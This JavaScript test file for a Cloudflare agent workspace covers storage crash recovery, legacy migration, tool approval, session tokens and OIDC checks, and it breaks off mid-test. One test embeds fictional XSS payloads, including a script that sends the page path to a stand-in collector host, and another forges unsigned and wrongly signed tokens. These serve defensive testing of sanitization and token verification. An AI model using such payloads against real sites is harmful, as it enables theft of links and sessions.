// The Cloudflare recipe's workspace (the SQLite workspace backend, its one provider, git and just-bash over the same rows) and the
// one-time move of the earlier storage layout, over an in-memory Durable Object storage (node:sqlite behind the `sql.exec` /
// `transactionSync` surface the object uses). A "crash" drops every in-memory object and reopens from the same database.
// Also the session expiry the Worker forwards, ending an open chat watch. Fictional content only.
import assert from 'node:assert/strict';
import test from 'node:test';
import { DatabaseSync } from 'node:sqlite';
import { BACKGROUND_CONTEXT as context } from '@earendil-works/chord/context';
import { createChatTransportHandler } from '@boring/agent/chat-transport';
import { openCloudflareWorkspace } from '../../examples/cloudflare/src/workspace.mjs';
import { legacyArtifact, sharedNotesPath } from '../../examples/cloudflare/src/legacy-storage.mjs';
import { LEGACY, previousWorkerRuns, seedLegacyLayout } from '../fixtures/cloudflare-legacy-storage.mjs';
import { approvedState, reloadCommand } from '../../examples/cloudflare/src/self-evolution-store.mjs';
import { defineAgent } from '@boring/agent/agents';
import { createRegistry } from '@earendil-works/pi-durable';
import { ACCESS_HEADER, CONVERSATION_HEADER, SESSION_BODY_LIMIT, SESSION_EXPIRES_HEADER, forwardedAccess, forwardedRequest, objectOf, renderView, sessionLink, sessionRevocation, signPersonSession, signSession, signViewLink, verifyPersonSession, verifySession, verifyViewLink } from '../../examples/cloudflare/src/view-links.mjs';
import { verifyIdToken } from '../../examples/cloudflare/src/oidc.mjs';
import { generateKeyPairSync, sign as signBytes } from 'node:crypto';

const ACCESS = { scopeId: 'recipe', principalId: 'owner', initiatorId: 'owner' };
const text = value => new TextEncoder().encode(value);
const decode = bytes => new TextDecoder().decode(bytes);
const locator = path => ({ resource: { providerId: 'workspace', path }, view: { kind: 'published' } });

/** Durable Object storage over node:sqlite. `faults.exec(query)` may throw; `faults.commit()` runs after a commit (a crash there). */
function durableStorage(db = new DatabaseSync(':memory:')) {
  const faults = {};
  let inTransaction = false;
  const toBinding = value => value instanceof ArrayBuffer ? new Uint8Array(value) : value;
  const toValue = value => value instanceof Uint8Array ? value.buffer.slice(value.byteOffset, value.byteOffset + value.byteLength) : value;
  const cursor = rows => ({ toArray: () => rows, [Symbol.iterator]: () => rows[Symbol.iterator]() });
  const storage = {
    db, faults,
    sql: { exec: (query, ...bindings) => {
      faults.exec?.(query);
      if (bindings.length === 0 && /;\s*\S/.test(query.trim())) { db.exec(query); return cursor([]); }
      const rows = db.prepare(query).all(...bindings.map(toBinding));
      return cursor(rows.map(row => Object.fromEntries(Object.entries(row).map(([key, value]) => [key, toValue(value)]))));
    } },
    transactionSync: work => {
      assert.ok(!inTransaction, 'transactionSync is not nested');
      inTransaction = true;
      db.exec('BEGIN');
      let result;
      try { result = work(); db.exec('COMMIT'); } catch (error) { db.exec('ROLLBACK'); throw error; } finally { inTransaction = false; }
      faults.commit?.();
      return result;
    },
  };
  return storage;
}

async function open(storage) {
  const workspace = openCloudflareWorkspace({ storage, context });
  const repo = await workspace.repository();
  return { workspace, files: workspace.files, env: repo.env, fs: workspace.fs, repository: repo.repository };
}
const fileOf = async (fs, path) => { const read = await fs.readTextFile(`/workspace/${path}`, context); return read.ok ? read.value : undefined; };
const latest = (files, path) => files.read({ target: locator(path), revision: { kind: 'latest' } }, ACCESS);
const publish = (files, changes, operationId = crypto.randomUUID()) => files.publication.publish({ operationId, atomicity: 'all-or-nothing', changes }, ACCESS);
const replace = (snapshot, value) => ({ kind: 'replace', target: snapshot.ref, bytes: text(value), mediaType: 'text/markdown' });
const create = (path, value) => ({ kind: 'create', target: locator(path), expected: { kind: 'absent' }, bytes: text(value), mediaType: 'text/markdown' });

async function seeded() {
  const storage = durableStorage();
  const first = await open(storage);
  assert.ok((await first.env.writeFile('/workspace/plan.md', 'v1 fictional plan\n', context)).ok);
  const read = await latest(first.files, 'plan.md');
  assert.equal(read.kind, 'available');
  return { storage, first, snapshot: read.snapshot };
}

// The editors' saves go through the one workspace provider: a save's file rows and its receipt commit in one transaction.
for (const boundary of ['receipt insert', 'file row', 'after commit']) {
  test(`a save interrupted (${boundary}): the receipt and the workspace bytes agree after a restart`, async () => {
    const { storage, first, snapshot } = await seeded();
    const operationId = `fictional-${boundary.replace(/\W+/g, '-')}`;
    const crash = () => { throw new Error(`fictional crash: ${boundary}`); };
    if (boundary === 'receipt insert') storage.faults.exec = query => { if (query.startsWith('INSERT INTO boring_operations') && storage.faults.inPublication) crash(); };
    if (boundary === 'file row') storage.faults.exec = query => { if (query.startsWith('INSERT INTO boring_workspace_files') && storage.faults.inPublication) crash(); };
    if (boundary === 'after commit') storage.faults.commit = () => { if (storage.faults.inPublication && storage.faults.wrote) { storage.faults.commit = undefined; crash(); } };
    const exec = storage.faults.exec;
    storage.faults.exec = query => { if (query.startsWith('INSERT INTO boring_workspace_files')) storage.faults.wrote = true; exec?.(query); };
    storage.faults.inPublication = true;
    const outcome = await publish(first.files, [replace(snapshot, 'v2 fictional editor\n')], operationId).then(result => result, error => ({ thrown: error.message }));
    storage.faults.inPublication = false;
    storage.faults.exec = undefined;

    const second = await open(storage);
    const lookup = await second.files.reconciliation.lookup(operationId, ACCESS);
    const bytes = await fileOf(second.fs, 'plan.md');
    if (boundary === 'after commit') {
      assert.notEqual(outcome.kind, 'committed', 'the caller never saw the commit');
      assert.equal(lookup.kind, 'committed', 'the receipt is durable');
      assert.equal(bytes, 'v2 fictional editor\n', 'so are the bytes');
      assert.equal((await latest(second.files, 'plan.md')).snapshot.ref.revision, lookup.receipt.changes[0].after.revision);
    } else {
      assert.notEqual(outcome.kind, 'committed');
      assert.notEqual(lookup.kind, 'committed', 'no receipt');
      assert.equal(bytes, 'v1 fictional plan\n', 'and no bytes');
    }
  });
}

test('a two-file save that fails on its second file changes nothing', async () => {
  const { storage, first, snapshot } = await seeded();
  let rows = 0;
  storage.faults.exec = query => { if (query.startsWith('INSERT INTO boring_workspace_files') && storage.faults.inPublication && ++rows === 2) throw new Error('fictional storage failure on the second file'); };
  storage.faults.inPublication = true;
  const outcome = await publish(first.files, [replace(snapshot, 'v2 fictional\n'), create('fresh.md', 'fictional fresh\n')], 'fictional-batch');
  storage.faults.inPublication = false; storage.faults.exec = undefined;
  assert.notEqual(outcome.kind, 'committed');
  const second = await open(storage);
  assert.equal(await fileOf(second.fs, 'plan.md'), 'v1 fictional plan\n');
  assert.equal(await fileOf(second.fs, 'fresh.md'), undefined);
  assert.notEqual((await second.files.reconciliation.lookup('fictional-batch', ACCESS)).kind, 'committed');
});

test('a command that overlaps an editor save makes the save a conflict, never overwritten; preconditions are checked against the files now', async () => {
  const { first, snapshot } = await seeded();
  // The agent's command starts first and writes after a pause; the editor saves from the revision it read before.
  const agent = first.env.exec('sleep 0.2; echo "AGENT fictional" > plan.md', { cwd: '/workspace' }, context);
  const saved = await publish(first.files, [replace(snapshot, 'EDITOR fictional\n')]);
  assert.ok((await agent).ok);
  assert.equal(saved.kind, 'conflict');
  assert.equal(await fileOf(first.fs, 'plan.md'), 'AGENT fictional\n');
  // An expected-absent guard on a path a command has since created.
  const current = (await latest(first.files, 'plan.md')).snapshot;
  assert.ok((await first.env.exec('echo fictional > lock.md', { cwd: '/workspace' }, context)).ok);
  const guarded = await first.files.publication.publish({ operationId: 'fictional-guard', atomicity: 'all-or-nothing', changes: [replace(current, 'EDITOR fictional\n')], preconditions: [{ kind: 'absent', target: locator('lock.md') }] }, ACCESS);
  assert.equal(guarded.kind, 'conflict');
  assert.equal(await fileOf(first.fs, 'plan.md'), 'AGENT fictional\n');
});

test('files, folders, deletions and git history are durable across a restart; no link can be made; a new object is seeded once', async () => {
  const storage = durableStorage();
  const first = await open(storage);
  assert.match(await fileOf(first.fs, 'README.md'), /# Workspace/);
  assert.ok((await first.env.exec('mkdir -p docs/empty && echo "fictional draft" > docs/draft.md && rm README.md && git add docs/draft.md && git commit -m "fictional draft"', { cwd: '/workspace' }, context)).ok);
  // A same-length edit is a change like any other.
  assert.ok((await first.env.writeFile('/workspace/docs/draft.md', 'fictional DRAFT\n', context)).ok);
  // Regular files and directories only: a symbolic link cannot be made, so no path aliases another.
  const link = await first.env.exec('ln -s docs alias', { cwd: '/workspace' }, context);
  assert.ok(!link.ok || link.value.exitCode !== 0, 'ln is refused');
  const second = await open(storage);
  assert.equal(await fileOf(second.fs, 'docs/draft.md'), 'fictional DRAFT\n');
  assert.equal(await fileOf(second.fs, 'README.md'), undefined, 'a deleted file stays deleted, never re-seeded');
  assert.ok((await second.fs.exists('/workspace/docs/empty', context)).value);
  assert.equal((await second.fs.exists('/workspace/alias', context)).value, false);
  assert.deepEqual((await second.repository.log()).map(entry => entry.commit.message.trim()), ['fictional draft', 'Initial commit']);
});

test('an object holding the earlier layout is moved into the workspace once, readable, with its history; every published document gets a file', async () => {
  const storage = durableStorage(await seedLegacyLayout());
  const first = await open(storage);
  // The agent's files, folders and git history.
  for (const [path, body] of Object.entries(LEGACY.files)) assert.equal(await fileOf(first.fs, path), body);
  assert.ok((await first.fs.exists(LEGACY.emptyDirectory, context)).value, 'an empty folder too');
  assert.deepEqual((await first.repository.log()).map(entry => entry.commit.message.trim()), [LEGACY.commit], 'the history is the saved one, not a new seed');
  assert.deepEqual((await first.repository.status()).filter(([path]) => Object.keys(LEGACY.files).includes(path)).map(([, head, work]) => [head, work]), Object.keys(LEGACY.files).map(() => [1, 1]), 'committed files are clean');
  // A symbolic link cannot exist here: it is not moved.
  assert.equal((await first.fs.exists(LEGACY.link.path, context)).value, false);
  assert.equal(first.workspace.migrated.links, 1);
  // Published documents never overwrite an agent file: the notes land beside the agent's notes.md and are the shared document there;
  // a document whose path and documents/ path are both taken lands under its revision.
  assert.equal(await fileOf(first.fs, 'notes.md'), LEGACY.files['notes.md']);
  assert.equal(sharedNotesPath(first.workspace.connection), 'documents/notes.md');
  assert.equal(decode((await latest(first.files, 'documents/notes.md')).snapshot.bytes), LEGACY.notes.at(-1));
  assert.equal(await fileOf(first.fs, LEGACY.artifact.path), LEGACY.artifact.body);
  assert.equal(await fileOf(first.fs, `documents/${LEGACY.clashing.path}`), LEGACY.files['documents/plan.md']);
  assert.equal(await fileOf(first.fs, `legacy-documents-2/${LEGACY.clashing.revision}/${LEGACY.clashing.path}`), LEGACY.clashing.body, 'all four named places taken: the first free numbered one');
  assert.deepEqual(legacyArtifact(first.workspace.connection, LEGACY.artifact.id), { path: LEGACY.artifact.path, title: LEGACY.artifact.title });
  assert.equal(first.workspace.migrated.documents, 3, 'every published document has a file');
  // Editors save through the provider over the moved files.
  const saved = await publish(first.files, [replace((await latest(first.files, 'documents/notes.md')).snapshot, 'fictional notes after the move\n')]);
  assert.equal(saved.kind, 'committed');
  // Once: a restart opens the moved workspace as it is, with nothing moved again.
  const second = await open(storage);
  assert.equal(second.workspace.migrated, undefined);
  assert.equal(await fileOf(second.fs, 'documents/notes.md'), 'fictional notes after the move\n');
});

test('upgrade, then the previous Worker, then upgrade again: the object opens and nothing is lost', async () => {
  const db = await seedLegacyLayout();
  const storage = durableStorage(db);
  const first = await open(storage);
  assert.ok((await first.env.writeFile('/workspace/after-upgrade.md', 'fictional\n', context)).ok);
  // The previous Worker cannot read the new file table (its workspace is unavailable while it runs) and writes newer notes.
  assert.match(previousWorkerRuns(db), /no such column/);
  const again = await open(storage);
  assert.equal(again.workspace.migrated.merged, true);
  assert.equal(await fileOf(again.fs, 'after-upgrade.md'), 'fictional\n');
  assert.equal(await fileOf(again.fs, 'documents/notes.md'), LEGACY.notes.at(-1), 'the first move\'s notes stay');
  assert.equal(await fileOf(again.fs, sharedNotesPath(again.workspace.connection)), LEGACY.rollbackNotes, 'the shared document is the newest published notes');
  assert.equal((await open(storage)).workspace.migrated, undefined, 'and the next open moves nothing');
});

test('an earlier workspace whose .git was deleted, or a new one emptied, is never seeded again', async () => {
  const legacy = await open(durableStorage(await seedLegacyLayout(undefined, { git: false })));
  assert.equal(await fileOf(legacy.fs, 'README.md'), LEGACY.files['README.md'], 'its README is not overwritten');
  assert.equal((await legacy.fs.exists('/workspace/.git', context)).value, false);
  // An object that only published documents: the first repository access and a reopen keep its moved README.
  const documents = durableStorage(await seedLegacyLayout(undefined, { documentsOnly: true }));
  assert.equal(await fileOf((await open(documents)).fs, 'README.md'), LEGACY.publishedReadme);
  assert.equal(await fileOf((await open(documents)).fs, 'README.md'), LEGACY.publishedReadme);
  const storage = durableStorage();
  const fresh = await open(storage);
  assert.ok((await fresh.fs.remove('/workspace/README.md', {}, context)).ok);
  assert.ok((await fresh.fs.remove('/workspace/.git', { recursive: true }, context)).ok);
  const reopened = await open(storage);
  assert.deepEqual((await reopened.fs.listDir('/workspace', context)).value, [], 'empty after a restart');
});

test('approved tools check their files and run in one workspace operation; a redelivered /reload is answered from its record', async () => {
  const first = await open(durableStorage());
  assert.ok((await first.env.exec('mkdir -p .agent/tools && echo "echo approved" > .agent/tools/greet.sh && echo \'{"name":"greet","description":"Greet.","parameters":{"type":"object"},"run":"sh .agent/tools/greet.sh"}\' > .agent/tools/greet.json', { cwd: '/workspace' }, context)).ok);
  const approved = approvedState(first.workspace.connection, first.workspace);
  const agent = defineAgent({ id: 'evolving', model: { provider: 'fictional', modelId: 'fictional' }, selfEvolving: { approval: approved }, workspace: 'workspace' });
  const registry = createRegistry(); agent.install(registry);
  const command = () => reloadCommand({ approved, agent, env: async () => first.env, requestId: 'channel:whatsapp:wamid.fictional-reload', context });
  const reply = await command();
  assert.match(reply, /Tools added: greet/);
  const greet = () => registry.snapshot().tools().find(item => item.tool.name === 'greet').tool.execute({}, { env: first.env }, context);
  assert.equal((await greet()).content[0].text.trim(), 'approved');
  // A command already queued replaces the script: the tool's check runs after it, in the same queue, and refuses.
  const writer = first.env.exec('sleep 0.2; echo "echo replaced" > .agent/tools/greet.sh', { cwd: '/workspace' }, context);
  const ran = await greet();
  assert.ok((await writer).ok);
  assert.match(ran.content[0].text, /did not run: \.agent\/tools\/greet\.sh changed since the approved reload/);
  // The same message again (its acknowledgement lost): the recorded report, and nothing newer is approved.
  const state = await approved.load();
  assert.equal(await command(), reply);
  assert.deepEqual(await approved.load(), state);
  assert.match((await greet()).content[0].text, /did not run/);
  // A call bound to one approval never runs against the next one's files: queued behind a command while reload B (another command,
  // another script) is approved, the earlier registration refuses.
  assert.ok((await first.env.exec('echo "echo B" > .agent/tools/b.sh && echo \'{"name":"greet","description":"Greet.","parameters":{"type":"object"},"run":"sh .agent/tools/b.sh"}\' > .agent/tools/greet.json', { cwd: '/workspace' }, context)).ok);
  const earlier = registry.snapshot().tools().find(item => item.tool.name === 'greet').tool;
  const blocker = first.env.exec('sleep 0.3', { cwd: '/workspace' }, context);
  const queued = earlier.execute({}, { env: first.env }, context);
  await reloadCommand({ approved, agent, env: async () => first.env, requestId: 'channel:whatsapp:wamid.fictional-reload-b', context });
  await blocker;
  assert.match((await queued).content[0].text, /did not run/);
  assert.equal((await greet()).content[0].text.trim(), 'B', 'the new registration runs');
  // A reload while a command is halfway through changing a tool (its description written, its script not yet): the scan is one
  // snapshot taken after the command, so the saved state is coherent and the tool runs, also after a restore.
  const halfway = first.env.exec('echo \'{"name":"greet","description":"Greet.","parameters":{"type":"object"},"run":"sh .agent/tools/c.sh"}\' > .agent/tools/greet.json; sleep 0.3; echo "echo C" > .agent/tools/c.sh', { cwd: '/workspace' }, context);
  await new Promise(resolve => setTimeout(resolve, 100));
  await reloadCommand({ approved, agent, env: async () => first.env, requestId: 'channel:whatsapp:wamid.fictional-reload-c', context });
  assert.ok((await halfway).ok);
  assert.equal((await greet()).content[0].text.trim(), 'C');
  const restored = defineAgent({ id: 'evolving', model: { provider: 'fictional', modelId: 'fictional' }, selfEvolving: { approval: approved }, workspace: 'workspace' });
  const registry2 = createRegistry(); restored.install(registry2); await restored.restore();
  assert.equal((await registry2.snapshot().tools().find(item => item.tool.name === 'greet').tool.execute({}, { env: first.env }, context)).content[0].text.trim(), 'C');
  // A plain file write (a conversation still selecting extensions from before the guard, resumed after an upgrade) waits for the
  // queue too: it cannot land between an approved tool's check and its run.
  assert.ok((await first.env.exec('echo "sleep 0.3; echo D" > .agent/tools/c.sh', { cwd: '/workspace' }, context)).ok);
  await reloadCommand({ approved, agent: restored, env: async () => first.env, requestId: 'channel:whatsapp:wamid.fictional-reload-d', context });
  const slow = registry2.snapshot().tools().find(item => item.tool.name === 'greet').tool.execute({}, { env: first.env }, context);
  await new Promise(resolve => setTimeout(resolve, 50));
  const order = [];
  const swapped = first.env.writeFile('/workspace/.agent/tools/c.sh', 'echo swapped\n', context).then(result => { order.push('write'); return result; });
  assert.equal((await slow.then(result => { order.push('tool'); return result; })).content[0].text.trim(), 'D', 'the approved script ran');
  assert.ok((await swapped).ok);
  assert.deepEqual(order, ['tool', 'write'], 'the write waited for the whole checked run');
  assert.match((await registry2.snapshot().tools().find(item => item.tool.name === 'greet').tool.execute({}, { env: first.env }, context)).content[0].text, /did not run/);
});

test('a move interrupted part-way leaves the earlier layout whole and runs again', async () => {
  const storage = durableStorage(await seedLegacyLayout());
  let renames = 0;
  storage.faults.exec = query => { if (query.startsWith('ALTER TABLE') && ++renames === 2) throw new Error('fictional crash during the move'); };
  assert.throws(() => openCloudflareWorkspace({ storage, context }), /fictional crash/);
  storage.faults.exec = undefined;
  const again = await open(storage);
  assert.equal(await fileOf(again.fs, 'documents/notes.md'), LEGACY.notes.at(-1));
  assert.equal(await fileOf(again.fs, 'README.md'), LEGACY.files['README.md']);
});

test('the unauthenticated session exchange reads its body under a cap and cancels an oversized stream', async () => {
  let cancelled = false, pulled = 0;
  const chunk = new Uint8Array(1024).fill(0x20);
  const endless = new ReadableStream({ pull: controller => { pulled++; controller.enqueue(chunk); }, cancel: () => { cancelled = true; } });
  const request = new Request('https://example.invalid/api/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: endless, duplex: 'half' });
  assert.equal(request.headers.get('content-length'), null, 'no declared length');
  assert.deepEqual(await sessionLink(request), { status: 413 });
  assert.ok(cancelled, 'the rest of the stream is cancelled');
  assert.ok(pulled * chunk.byteLength <= SESSION_BODY_LIMIT + 2 * chunk.byteLength, `read stops at the cap (${pulled} chunks)`);

  const declared = new Request('https://example.invalid/api/session', { method: 'POST', headers: { 'content-type': 'application/json', 'content-length': '100000' }, body: 'x' });
  assert.deepEqual(await sessionLink(declared), { status: 413 });
  const form = new Request('https://example.invalid/api/session', { method: 'POST', headers: { 'content-type': 'text/plain' }, body: '{"link":"x"}' });
  assert.deepEqual(await sessionLink(form), { status: 415 });
  const ok = new Request('https://example.invalid/api/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ link: 'fictional.link' }) });
  assert.deepEqual(await sessionLink(ok), { link: 'fictional.link' });
});

test('a link URL never runs generated content: the item is escaped into a sandboxed srcdoc frame under a fixed, script-free page', async () => {
  // A fictional page that would send the link (its own address) to a fictional collector, and tries to break out of the attribute.
  const steal = `<script>location.replace('https://collector.example/?l='+encodeURIComponent(location.pathname))</script>`;
  const items = [
    { title: 'Fictional "page"', type: 'html', text: `<h1>Fictional</h1>${steal}"></iframe><script>top.location='https://collector.example/'</script><svg onload="alert(1)"/>` },
    { title: 'Fictional notes', type: 'markdown', text: `# Fictional\n\n${steal}\n<meta http-equiv="refresh" content="0;url=https://collector.example/">` },
    { title: 'fictional.svg', type: 'svg', text: `<svg xmlns="http://www.w3.org/2000/svg">${steal}</svg>` },
  ];
  for (const item of items) {
    const response = renderView(item), html = await response.text(), csp = response.headers.get('content-security-policy');
    assert.doesNotMatch(html, /<script|<meta http-equiv|<svg/i, `${item.type}: no executable or navigating markup at the link URL`);
    const frames = [...html.matchAll(/<iframe\b([^>]*)>/g)];
    assert.equal(frames.length, 1, `${item.type}: one frame`);
    const sandbox = /\bsandbox="([^"]*)"/.exec(frames[0][1])?.[1];
    assert.equal(sandbox, item.type === 'html' ? 'allow-scripts' : '', `${item.type}: scripts only for HTML, nothing else allowed`);
    assert.doesNotMatch(html, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
    assert.match(frames[0][1], /referrerpolicy="no-referrer"/);
    const srcdoc = /\bsrcdoc="([^"]*)"/.exec(frames[0][1])[1].replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
    if (item.type === 'html') assert.ok(srcdoc.includes(item.text), 'the page itself, unchanged, only inside the frame');
    if (item.type === 'svg') assert.match(srcdoc, /<img alt="" src="data:image\/svg\+xml,/, 'an SVG is an image: its scripts never run');
    // The frame's document inherits this policy: it is the policy the item runs under.
    assert.match(csp, item.type === 'html' ? /^sandbox allow-scripts;/ : /^sandbox;/);
    for (const directive of ["default-src 'none'", "frame-src 'none'", "form-action 'none'", "base-uri 'none'"]) assert.ok(csp.includes(directive), `${item.type}: ${directive}`);
    if (item.type === 'html') assert.match(csp, /script-src 'unsafe-inline' https:\/\/cdnjs\.cloudflare\.com https:\/\/cdn\.jsdelivr\.net;.*connect-src 'none'/);
    else assert.doesNotMatch(csp, /script-src/);
    assert.equal(response.headers.get('referrer-policy'), 'no-referrer');
  }
});

test('exec enforces options.timeout with the native timeout error', async () => {
  const { env } = await open(durableStorage());
  const started = Date.now();
  const result = await env.exec('sleep 5', { cwd: '/workspace', timeout: 1 }, context);
  assert.equal(result.ok, false);
  assert.equal(result.error.code, 'timeout');
  assert.ok(Date.now() - started < 4000, 'stopped near the timeout');
  // The shell is usable afterwards.
  assert.ok((await env.exec('true', { cwd: '/workspace', timeout: 5 }, context)).ok);
});

test('an open chat watch with a session token ends when the session expires', async () => {
  const secret = 'fictional-secret';
  const session = await verifySession(secret, await signSession(secret, {}, 1));
  assert.ok(session);
  // A client's own copy of the expiry header never reaches the object; the Worker's verified one does.
  const spoofed = new Request('https://fixture.invalid/api/chat?op=watch', { headers: { [SESSION_EXPIRES_HEADER]: '99999999999' } });
  assert.equal(forwardedRequest(spoofed).headers.get(SESSION_EXPIRES_HEADER), null);
  const forwarded = forwardedRequest(spoofed, session.exp);
  assert.equal(forwarded.headers.get(SESSION_EXPIRES_HEADER), String(session.exp));
  assert.equal(sessionRevocation(forwardedRequest(spoofed)), undefined, 'the owner token has no expiry');

  const closed = Promise.withResolvers();
  const watch = { value: { entries: [], docs: {} }, closed: closed.promise, start: () => {}, stop: async () => { closed.resolve({ reason: 'stopped' }); } };
  const handler = createChatTransportHandler({ authenticate: async request => ({ conversation: { watch: async () => watch }, context, revoked: sessionRevocation(request) }) });
  // Node unrefs AbortSignal.timeout's timer (a Worker does not): keep the test's event loop alive while the watch is open.
  const alive = setInterval(() => {}, 100);
  const started = Date.now();
  const response = await handler(forwarded);
  assert.equal(response.status, 200);
  let body = '';
  const reader = response.body.getReader();
  for (;;) { const next = await reader.read(); if (next.done) break; body += decode(next.value); }
  clearInterval(alive);
  assert.match(body, /"kind":"end","reason":"revoked"/);
  assert.ok(Date.now() - started <= 2500, 'ended at the expiry');
  // After expiry the same forwarded request is refused outright.
  assert.equal((await handler(forwardedRequest(spoofed, session.exp))).status, 403);
});

test('signup access: links, link sessions and person sessions name their object, are not interchangeable, and access headers are the Worker\'s only', async () => {
  const secret = 'fictional-secret';
  const link = await signViewLink(secret, { kind: 'notes', conversation: '7', object: 'p-alice' });
  assert.equal(objectOf(await verifyViewLink(secret, link)), 'p-alice');
  assert.equal(objectOf({ kind: 'notes' }), 'main', 'a link made before objects were named belongs to the owner');
  const session = await signSession(secret, { conversation: 7, object: 'p-alice' });
  assert.deepEqual([(await verifySession(secret, session))?.scope, (await verifySession(secret, session))?.object], ['link', 'p-alice']);
  const person = await signPersonSession(secret, { object: 'p-alice', subject: 'sub-alice' }, 60);
  assert.equal((await verifyPersonSession(secret, person))?.object, 'p-alice');
  // Each token is signed for one purpose: a link is no session, a link session is no person session and the reverse.
  assert.equal(await verifySession(secret, link), undefined);
  assert.equal(await verifyPersonSession(secret, session), undefined);
  assert.equal(await verifySession(secret, person), undefined);
  // A client cannot claim an access or a conversation: the Worker's copies replace whatever it sent.
  const spoofed = new Request('https://fixture.invalid/api/conversations', { headers: { [ACCESS_HEADER]: 'operator', [CONVERSATION_HEADER]: '1' } });
  assert.deepEqual(forwardedAccess(forwardedRequest(spoofed)), { scope: 'none' });
  assert.deepEqual(forwardedAccess(forwardedRequest(spoofed, 1, { scope: 'link', conversation: '7' })), { scope: 'link', conversation: '7' });
});

test('the hub id_token is accepted only with its signature, issuer, audience, expiry and nonce', async () => {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const jwks = { keys: [{ ...publicKey.export({ format: 'jwk' }), kid: 'k1', alg: 'EdDSA' }] };
  const settings = { issuer: 'https://hub.example.test/api/auth', clientId: 'fictional-client' };
  const discovery = { jwks_uri: 'https://hub.example.test/api/auth/jwks', id_token_signing_alg_values_supported: ['EdDSA'] };
  const fetcher = async () => Response.json(jwks);
  const b64 = value => Buffer.from(value).toString('base64url');
  const now = Math.floor(Date.now() / 1000);
  const token = (claims, { alg = 'EdDSA', key = privateKey } = {}) => { const head = b64(JSON.stringify({ alg, kid: 'k1' })), body = b64(JSON.stringify({ iss: settings.issuer, aud: settings.clientId, sub: 'sub-fictional', nonce: 'n1', iat: now, exp: now + 300, ...claims }));
    return `${head}.${body}.${b64(signBytes(null, Buffer.from(`${head}.${body}`), key))}`; };
  assert.equal((await verifyIdToken(settings, token({}), 'n1', discovery, fetcher)).sub, 'sub-fictional');
  const refusals = { 'nonce mismatch': [token({}), 'n2'], 'issuer mismatch': [token({ iss: 'https://other.example.test' }), 'n1'], 'audience mismatch': [token({ aud: 'other' }), 'n1'],
    expired: [token({ exp: now - 600 }), 'n1'], 'signature invalid': [token({}, { key: generateKeyPairSync('ed25519').privateKey }), 'n1'], 'not accepted': [token({}, { alg: 'none' }), 'n1'] };
  for (const [reason, [value, nonce]] of Object.entries(refusals)) await assert.rejects(verifyIdToken(settings, value, nonce, discovery, fetcher), new RegExp(reason), reason);
});

/** `cloudflare:workers` exists only in workerd: a loader hook (registered once) gives the Worker modules plain stand-ins here. */
let shimmed;
function workersShim() {
  shimmed ??= import('node:module').then(({ register }) => {
    const stub = 'export class DurableObject { constructor(ctx, env) { this.ctx = ctx; this.env = env; } } export class RpcTarget {} export class WorkflowEntrypoint {} export const exports = {}; export const env = {};';
    register(`data:text/javascript,${encodeURIComponent(`export async function resolve(specifier, context, next) { return specifier === 'cloudflare:workers' ? { url: ${JSON.stringify(`data:text/javascript,${encodeURIComponent(stub)}`)}, shortCircuit: true } : next(specifier, context); }`)}`);
  });
  return shimmed;
}

test('the signup registry alarm never pushes out a recovery scheduled while it awaited a slow adoption', async () => {
  await workersShim();
  const { Registry } = await import('../../examples/cloudflare/src/registry.mjs');
  const data = new Map();
  let alarm = null;
  const storage = { get: async key => data.get(key), put: async (key, value) => { if (typeof key === 'object') for (const [k, v] of Object.entries(key)) data.set(k, v); else data.set(key, value); },
    delete: async keys => { for (const key of [keys].flat()) data.delete(key); }, list: async ({ prefix }) => new Map([...data].filter(([key]) => key.startsWith(prefix))),
    getAlarm: async () => alarm, setAlarm: async at => { alarm = at; } };
  // Alice's object answers slowly: her adoption call is held until the test releases it.
  let release;
  const held = new Promise(resolve => { release = resolve; });
  const adopted = [];
  const env = { ASSISTANT: { getByName: object => ({ adopt: async () => { if (object === 'p-alice') await held; adopted.push(object); } }) } };
  const registry = new Registry({ storage }, env);
  const redeem = async (object, phone, messageId) => {
    const { code } = await registry.issue({ person: { object, subject: `sub-${object}` }, phone });
    assert.equal((await registry.redeem({ code, phone, messageId })).status, 'linked');
  };
  await redeem('p-alice', '+15550100001', 'wamid.alice');
  // Her Worker died before adopting; her obligation is due. The runtime clears the alarm that fires.
  const aliceKey = [...data.keys()].find(key => key.startsWith('adopt:p-alice'));
  data.set(aliceKey, { ...data.get(aliceKey), at: Date.now() - 60_000 });
  alarm = null;
  const running = registry.alarm();
  await new Promise(resolve => setTimeout(resolve, 20));
  // Meanwhile Bob redeems (his Worker dies too): his recovery is due in about 15 s.
  await redeem('p-bob', '+15550100002', 'wamid.bob');
  const bobRecovery = alarm;
  assert.ok(bobRecovery <= Date.now() + 15_000);
  release();
  await running;
  assert.deepEqual(adopted, ['p-alice']);
  assert.ok(alarm !== null && alarm <= bobRecovery, `the alarm stays at Bob's recovery (${alarm - Date.now()} ms away), not a later snapshot time`);
});

test('a hub link job whose old grant is refused while a new sign-in stored a fresh one keeps the link and posts it with the new grant', async () => {
  await workersShim();
  const { HubIdentityLink } = await import('../../examples/cloudflare/src/hub.mjs');
  const data = new Map();
  const storage = { get: async key => data.get(key), put: async (key, value) => { if (typeof key === 'object') for (const [k, v] of Object.entries(key)) data.set(k, v); else data.set(key, value); },
    delete: async keys => { for (const key of [keys].flat()) data.delete(key); } };
  const issuer = 'https://hub.example.test/api/auth';
  const env = { HUB_ISSUER: issuer, OIDC_CLIENT_ID: 'fictional-client', OIDC_CLIENT_SECRET: 'fictional-secret', HUB_APP_KEY: 'app_fictional' };
  // The old grant's refresh is held, then refused (invalid_grant); the link POSTs are recorded.
  let releaseRefresh;
  const refreshHeld = new Promise(resolve => { releaseRefresh = resolve; });
  const posts = [];
  const fetcher = async (url, init) => {
    const path = new URL(url).pathname;
    if (path.endsWith('/.well-known/openid-configuration')) return Response.json({ issuer, authorization_endpoint: `${issuer}/oauth2/authorize`, token_endpoint: `${issuer}/oauth2/token`, jwks_uri: `${issuer}/jwks` });
    if (path.endsWith('/oauth2/token')) { await refreshHeld; return Response.json({ error: 'invalid_grant' }, { status: 400 }); }
    if (path === '/v1/app/whatsapp-identity') { posts.push(JSON.parse(init.body)); return Response.json({ linked: true, created: true }); }
    return new Response(null, { status: 404 });
  };
  const link = new HubIdentityLink({ env, storage, fetcher });
